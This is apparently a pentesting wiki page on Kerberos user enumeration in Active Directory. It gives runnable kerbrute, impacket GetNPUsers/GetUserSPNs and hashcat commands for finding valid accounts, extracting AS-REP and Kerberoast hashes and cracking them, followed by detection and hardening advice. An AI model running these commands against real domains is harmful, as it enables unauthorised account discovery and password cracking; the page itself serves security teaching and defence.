---
title: Kerberos enumeration
slug: kerberos-enum
---

> **TL;DR:** The KDC on 88/tcp returns distinct error codes for valid-vs-invalid principals during AS-REQ, giving an unauthenticated attacker a fast username oracle and a list of AS-REP-roastable accounts.

## What it is
Kerberos enumeration abuses the fact that the AS-REQ exchange validates the principal name before pre-auth. `KDC_ERR_PREAUTH_REQUIRED` (24) means the account exists, `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6) means it does not, and a successful AS-REP (no pre-auth requested) means the account has `DONT_REQUIRE_PREAUTH` set — i.e. it is AS-REP roastable. The whole loop happens before any password is sent and leaves only Kerberos auth-service traffic in logs.

## Preconditions / where it applies
- Network reach to a domain controller on 88/tcp (and ideally 88/udp).
- Knowledge of the Kerberos realm — almost always the AD DNS domain in upper case.
- A username candidate list — usernames from [[osint-recon]], `firstname.lastname` permutations, or `whoami` from a foothold.
- Related: [[ldap-enum]], [[smb-enum]], [[password-spraying]].

## Technique
Validate users with kerbrute, the de-facto tool. It is fast because each probe is a single UDP packet:

```bash
kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt
```

Output flags hits as `VALID USERNAME` and AS-REP-roastable accounts separately. Pipe the latter into hash extraction with impacket:

```bash
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt \
  -no-pass -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

Once you have a credential, pivot to Kerberoasting all SPN-bearing accounts:

```bash
GetUserSPNs.py corp.local/alice:Spring2026 -dc-ip 10.0.0.10 \
  -request -outputfile spns.hashes
hashcat -m 13100 spns.hashes wordlist.txt -r best64.rule
```

Notes:
- Timestamp skew of more than 5 minutes from the KDC yields `KRB_AP_ERR_SKEW`; sync time with `ntpdate` against the DC before bulk probing.
- A trailing `$` denotes a machine account — machine accounts are not usually AS-REP roastable but are valid principals.

## Detection and defence
- Event ID 4768 (TGT requested) with `Status 0x6` and a high failure rate from one source — classic kerbrute signature. Splunk/Sentinel rules exist out-of-the-box.
- Set `DONT_REQUIRE_PREAUTH` only when truly needed; audit with `Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'`.
- Long, machine-generated service-account passwords plus AES-only encryption types break Kerberoast in practice.
- Network-level: rate-limit AS-REQ from non-domain segments via a host firewall on the DC.

## References
- [HackTricks — pentesting Kerberos 88](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88.html) — error-code table and tool list.
- [kerbrute](https://github.com/ropnop/kerbrute) — the canonical username-enumeration tool, with usage notes.
- [The Hacker Recipes — AS-REP roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) — explains the pre-auth disabled flag and the offline crack.
- [SpecterOps — Roasting AS-REPs](https://posts.specterops.io/) — background research and detection guidance.
